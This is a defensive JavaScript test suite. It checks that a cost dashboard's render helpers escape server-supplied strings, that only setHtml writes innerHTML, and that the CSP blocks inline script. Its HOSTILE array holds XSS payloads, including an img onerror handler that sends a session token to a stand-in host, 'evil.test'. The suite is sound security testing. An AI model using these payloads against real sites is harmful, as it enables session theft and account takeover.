// test/dashboardRender.test.js - server strings can never become markup in the dashboard.
//
// Audit result that motivated this: dashboard.js assigned template strings to innerHTML in
// 25 places, interpolating values chosen by whoever holds an API key (model name, team,
// agent id, key label, alert text built from them, audit actor/target). A model name of
// <img src=x onerror=...> became a live element in an administrator's dashboard. The CSP
// stops a browser running that handler; this test pins the escaping, which is what stops
// the markup existing at all.
//
// WHAT THIS CAN AND CANNOT PROVE. There is no browser and no DOM here (and no new test
// dependency). It proves: (1) the HTML STRINGS the dashboard hands to innerHTML contain no
// attacker-controlled tags or attributes, by comparing the tag/attribute structure of the
// output for hostile data with the structure for benign data; (2) statically, that the
// dashboard has no way to assign innerHTML except through setHtml(), and no template
// literal containing markup that is not html``-tagged. It cannot prove how a particular
// browser parses the output, or that no other code path (a future one) is safe, which is
// what the static rules are for.

const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");

const PUBLIC = path.join(__dirname, "..", "public");
const R = require("../public/render.js");
const { html, raw, setHtml, escapeHtml, SafeHtml } = R;

const HOSTILE = [
  '<img src=x onerror="fetch(`//evil.test/?t=`+localStorage.finops_session_token)">',
  '"><script>alert(1)</script>',
  "'><svg/onload=alert(1)>",
  "</td></tr></table><h1>spoofed</h1>",
  '" onmouseover="alert(1)" x="',
  "javascript:alert(1)",
  "<a href=\"//evil.test\">click</a>",
  "&lt;already&gt; & <b>mixed</b>",
];

// ------------------------------------------------------------------ escaping
test("escapeHtml escapes the five characters that matter, in text and attribute positions", () => {
  assert.equal(escapeHtml(`&<>"'`), "&amp;&lt;&gt;&quot;&#39;");
  assert.equal(escapeHtml("plain text 123"), "plain text 123");
  assert.equal(escapeHtml(null), "");
  assert.equal(escapeHtml(undefined), "");
  assert.equal(escapeHtml(0), "0");
  assert.equal(escapeHtml(false), "false");
  assert.equal(escapeHtml("\u202e rtl & ünïcode ✓"), "\u202e rtl &amp; ünïcode ✓");
});

test("html`` escapes interpolated values but not the author's own markup", () => {
  assert.equal(html`<b>${"<i>x</i>"}</b>`.toString(), "<b>&lt;i&gt;x&lt;/i&gt;</b>");
  assert.equal(html`<td class="t-${'" onclick="x'}">y</td>`.toString(), '<td class="t-&quot; onclick=&quot;x">y</td>');
});

test("html`` passes SafeHtml through, flattens arrays of it, and still escapes strings inside plain arrays", () => {
  const row = (v) => html`<li>${v}</li>`;
  assert.equal(html`<ul>${["a", "<b>"].map(row)}</ul>`.toString(), "<ul><li>a</li><li>&lt;b&gt;</li></ul>");
  assert.equal(html`<p>${["<x>", "<y>"]}</p>`.toString(), "<p>&lt;x&gt;&lt;y&gt;</p>", "a plain array of strings is data, not markup");
  assert.equal(html`<p>${raw("<hr>")}</p>`.toString(), "<p><hr></p>");
  assert.equal(html`<p>${html`<em>${"<z>"}</em>`}</p>`.toString(), "<p><em>&lt;z&gt;</em></p>");
});

test("setHtml accepts only html`` results; a plain string is refused (it would bypass escaping)", () => {
  const el = { innerHTML: "" };
  setHtml(el, html`<b>${"<x>"}</b>`);
  assert.equal(el.innerHTML, "<b>&lt;x&gt;</b>");
  assert.throws(() => setHtml(el, "<img src=x onerror=alert(1)>"), TypeError);
  assert.throws(() => setHtml(el, { text: "<b>" }), TypeError);
  assert.throws(() => setHtml(el, ["<b>"]), TypeError);
  assert.ok(html`x` instanceof SafeHtml);
});

// ------------------------------------------------- structure: hostile == benign
// A small tokenizer for tags and their attribute NAMES that honours quoting, so an escaped
// payload inside a quoted attribute value is one value, but an unescaped quote that breaks
// out of it would show up as an extra attribute.
function structure(markup) {
  const out = [];
  const tagRe = /<(\/?)([a-zA-Z][a-zA-Z0-9]*)((?:\s+[^\s"'=<>\/]+(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s"'=<>`]+))?)*)\s*\/?>/g;
  let m, last = 0;
  while ((m = tagRe.exec(markup))) {
    // anything between tags that still contains a "<" is injected/stray markup
    out.push({ stray: markup.slice(last, m.index).includes("<") });
    const names = [...m[3].matchAll(/\s+([^\s"'=<>\/]+)(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s"'=<>`]+))?/g)].map((a) => a[1]);
    out.push({ tag: (m[1] ? "/" : "") + m[2].toLowerCase(), attrs: names });
    last = tagRe.lastIndex;
  }
  out.push({ stray: markup.slice(last).includes("<") });
  return out;
}

const benign = "plain";
const mkRows = (v) => ({
  model: [{ provider: v, model: v, event_count: v, total_cost: 1.5 }],
  budget: [{ scope_type: v, scope_value: v, spent_this_month: 1, monthly_limit_usd: 2, alert_tier: v, pct_used: v }],
  recs: [{ current: { provider: v, model: v }, suggested: { provider: v, model: v }, estimated_savings_usd: 1, estimated_savings_pct: v, caveat: v }],
  alerts: [{ type: v, message: v, created_at: v }],
  reconcile: [{ day: v, provider: v, reported_cost: 1, tracked_cost: 2, gap_usd: 1, gap_pct: v, flagged: true }],
  backups: [{ name: v, sizeBytes: 2048, createdAt: "2026-10-21T00:00:00Z" }],
  audit: [{ action: v, actor: v, target: v, created_at: v }],
});
const builders = {
  model: (rows) => R.modelRowsHtml(rows),
  budget: (rows) => R.budgetRowsHtml(rows),
  recs: (rows) => R.recommendationsHtml(rows),
  alerts: (rows) => R.alertsHtml(rows),
  reconcile: (rows) => R.reconcileRowsHtml(rows),
  backups: (rows) => R.backupRowsHtml(rows),
  audit: (rows) => R.auditHtml(rows),
};
const toString = (x) => (Array.isArray(x) ? x.map(String).join("") : String(x));

for (const [panel, build] of Object.entries(builders)) {
  test(`${panel}: hostile values in every field add no tags, attributes or stray markup`, () => {
    const expected = structure(toString(build(mkRows(benign)[panel])));
    assert.ok(expected.filter((t) => t.tag).length > 0, "the benign render has structure to compare against");
    for (const evil of HOSTILE) {
      const out = toString(build(mkRows(evil)[panel]));
      assert.deepEqual(structure(out), expected, `markup structure changed for payload ${JSON.stringify(evil)}`);
      assert.ok(!out.includes("<img"), "no injected <img>");
      assert.ok(!out.includes("<script"), "no injected <script>");
      if (/[<>"']/.test(evil)) assert.ok(out.includes(escapeHtml(evil)), "the payload appears, as escaped text");
    }
  });
}

test("login status and one-line messages escape the username and error text", () => {
  for (const evil of HOSTILE) {
    assert.deepEqual(structure(String(R.loginStatusHtml(evil))), structure(String(R.loginStatusHtml("kunal"))));
    assert.deepEqual(structure(String(R.messageHtml("danger", evil))), structure(String(R.messageHtml("danger", "oops"))));
    assert.deepEqual(structure(String(R.errorCardHtml(evil, ". Is the server running?"))), structure(String(R.errorCardHtml("oops", ". Is the server running?"))));
    assert.deepEqual(structure(String(R.reconcileErrorRowHtml(evil))), structure(String(R.reconcileErrorRowHtml("oops"))));
  }
  assert.match(String(R.messageHtml("good", "ok")), /var\(--good\)/);
  assert.match(String(R.messageHtml("nonsense", "x")), /var\(--danger\)/, "an unknown kind falls back to the error colour, never to attacker text");
});

test("the empty states render without data and the panels keep their markup (no visual change)", () => {
  assert.match(String(R.budgetRowsHtml([])), /No budgets set/);
  assert.match(String(R.alertsHtml([])), /No alerts yet/);
  assert.match(String(R.reconcileRowsHtml([])), /No billing exports uploaded yet/);
  assert.match(String(R.auditHtml([])), /No audit entries yet/);
  assert.match(String(R.backupRowsHtml(null)), /No backups yet/);
  assert.match(String(R.recommendationsHtml([])), /No recommendations yet/);
  const row = String(R.modelRowsHtml([{ provider: "openai", model: "gpt-4.1", event_count: 3, total_cost: 1.5 }]));
  assert.equal(row, "<tr><td>openai</td><td>gpt-4.1</td><td>3</td><td>$1.50</td></tr>");
});

// -------------------------------------------------------------- static rules
// A small lexer: finds every template literal in a JS source, knows whether it is
// immediately preceded by the tag `html`, and handles nesting (${ ... `...` ... }), strings,
// and comments. Good enough for this codebase; it over-reports rather than under-reports.
function templateLiterals(src) {
  const found = [];
  const stack = []; // each entry: { kind: "template"|"expr", tagged, start, depth }
  let i = 0;
  const top = () => stack[stack.length - 1];
  while (i < src.length) {
    const ctx = top();
    const c = src[i];
    if (ctx && ctx.kind === "template") {
      if (c === "\\") { i += 2; continue; }
      if (c === "`") { found.push({ tagged: ctx.tagged, text: src.slice(ctx.start + 1, i) }); stack.pop(); i++; continue; }
      if (c === "$" && src[i + 1] === "{") { stack.push({ kind: "expr", depth: 1 }); i += 2; continue; }
      i++; continue;
    }
    // plain code (top level or inside ${ })
    if (c === "/" && src[i + 1] === "/") { while (i < src.length && src[i] !== "\n") i++; continue; }
    if (c === "/" && src[i + 1] === "*") { const e = src.indexOf("*/", i + 2); i = e === -1 ? src.length : e + 2; continue; }
    if (c === '"' || c === "'") { i++; while (i < src.length && src[i] !== c) { if (src[i] === "\\") i++; i++; } i++; continue; }
    if (c === "`") {
      const before = src.slice(Math.max(0, i - 5), i); // 5: `html` plus the character before it, so `foohtml` is not the tag
      stack.push({ kind: "template", tagged: /(^|[^A-Za-z0-9_$.])html$/.test(before), start: i });
      i++; continue;
    }
    if (ctx && ctx.kind === "expr") {
      if (c === "{") ctx.depth++;
      if (c === "}") { ctx.depth--; if (ctx.depth === 0) stack.pop(); }
    }
    i++;
  }
  return found;
}

test("the template-literal scanner itself: nesting, tags, strings and comments", () => {
  const ok = templateLiterals("const a = html`<b>${x}</b>`; // `<i>` in a comment\nconst s = '`<u>`';");
  assert.deepEqual(ok.map((t) => [t.tagged, t.text]), [[true, "<b>${x}</b>"]]);
  const nested = templateLiterals("const a = html`<p>${rows.map((r) => html`<li>${r}</li>`)}</p>`;");
  assert.equal(nested.length, 2);
  assert.ok(nested.every((t) => t.tagged));
  const bad = templateLiterals("el.x = `<td>${v}</td>`; const q = html`<a>${`<b>${v}</b>`}</a>`;");
  assert.deepEqual(bad.map((t) => t.tagged), [false, false, true], "an untagged template inside an html`` expression is still untagged");
  assert.deepEqual(templateLiterals("x = `a`; y = foohtml`<b>`;").map((t) => t.tagged), [false, false], "`foohtml` is not the html tag");
});

const MARKUP = /<\/?[a-zA-Z!]/;

test("dashboard.js: every template literal that contains markup is an html`` template", () => {
  const src = fs.readFileSync(path.join(PUBLIC, "dashboard.js"), "utf8");
  const bad = templateLiterals(src).filter((t) => !t.tagged && MARKUP.test(t.text)).map((t) => t.text.trim().slice(0, 70));
  assert.deepEqual(bad, [], "markup built from an untagged template would reach the DOM unescaped");
});

test("only render.js may assign innerHTML, exactly once (in setHtml); no other HTML sinks anywhere in the frontend", () => {
  const files = fs.readdirSync(PUBLIC).filter((f) => f.endsWith(".js") || f.endsWith(".html"));
  assert.ok(files.includes("dashboard.js") && files.includes("render.js"));
  const sink = /\.(innerHTML|outerHTML)\s*[+]?=|insertAdjacentHTML|document\.write|\.createContextualFragment|\bsrcdoc\b/g;
  for (const f of files) {
    const hits = (fs.readFileSync(path.join(PUBLIC, f), "utf8").match(sink) || []).length;
    if (f === "render.js") assert.equal(hits, 1, "render.js assigns innerHTML exactly once, inside setHtml");
    else assert.equal(hits, 0, `${f} must not write HTML directly; use setHtml(el, html\`...\`) from render.js`);
  }
});

test("dashboard.js builds its HTML through render.js (no private copies of the row builders)", () => {
  const src = fs.readFileSync(path.join(PUBLIC, "dashboard.js"), "utf8");
  assert.match(src, /FinopsRender/);
  for (const needle of ["R.modelRowsHtml", "R.budgetRowsHtml", "R.recommendationsHtml", "R.alertsHtml", "R.reconcileRowsHtml", "R.backupRowsHtml", "R.auditHtml", "R.loginStatusHtml", "R.messageHtml", "R.errorCardHtml"]) {
    assert.ok(src.includes(needle), `dashboard.js should use ${needle}`);
  }
});

test("index.html loads render.js before dashboard.js", () => {
  const page = fs.readFileSync(path.join(PUBLIC, "index.html"), "utf8");
  const a = page.indexOf('src="render.js"') !== -1 ? page.indexOf('src="render.js"') : page.indexOf('src="/render.js"');
  const b = page.search(/src="\/?dashboard\.js"/);
  assert.ok(a !== -1 && b !== -1, "both scripts are referenced");
  assert.ok(a < b, "render.js must come first or FinopsRender is undefined when dashboard.js runs");
});

// --------------------------------------------------------------------- the CSP
function cspDirectives() {
  const helmet = require("helmet");
  const { helmetOptions } = require("../server/securityHeaders");
  const headers = {};
  const res = { setHeader: (k, v) => { headers[k.toLowerCase()] = v; }, removeHeader() {}, getHeader: (k) => headers[k.toLowerCase()] };
  helmet(helmetOptions)({ headers: {} }, res, () => {});
  const map = {};
  for (const part of String(headers["content-security-policy"]).split(";")) {
    const [name, ...vals] = part.trim().split(/\s+/);
    if (name) map[name] = vals;
  }
  return map;
}

test("CSP: scripts only from 'self'; inline script, javascript: URLs and inline event handlers are all blocked", () => {
  const csp = cspDirectives();
  assert.deepEqual(csp["script-src"], ["'self'"], "script-src is exactly 'self' (no 'unsafe-inline', 'unsafe-eval', hosts or nonces)");
  assert.deepEqual(csp["script-src-attr"], ["'none'"], "inline event handlers (onerror=, onclick=) are disallowed");
  assert.deepEqual(csp["default-src"], ["'self'"]);
  assert.deepEqual(csp["object-src"], ["'none'"]);
  assert.deepEqual(csp["form-action"], ["'self'"]);
  assert.deepEqual(csp["connect-src"], ["'self'"]);
  assert.deepEqual(csp["img-src"], ["'self'", "data:"]);
  for (const [name, vals] of Object.entries(csp)) {
    if (name.startsWith("script-src") || name === "default-src") assert.ok(!vals.includes("'unsafe-inline'") && !vals.includes("'unsafe-eval'"), `${name} must not be loosened`);
  }
});

test("index.js uses the pinned options rather than its own copy", () => {
  const src = fs.readFileSync(path.join(__dirname, "..", "server", "index.js"), "utf8");
  assert.match(src, /helmet\(require\("\.\/securityHeaders"\)\.helmetOptions\)/);
  assert.ok(!/scriptSrc/.test(src), "no second CSP definition in index.js");
});
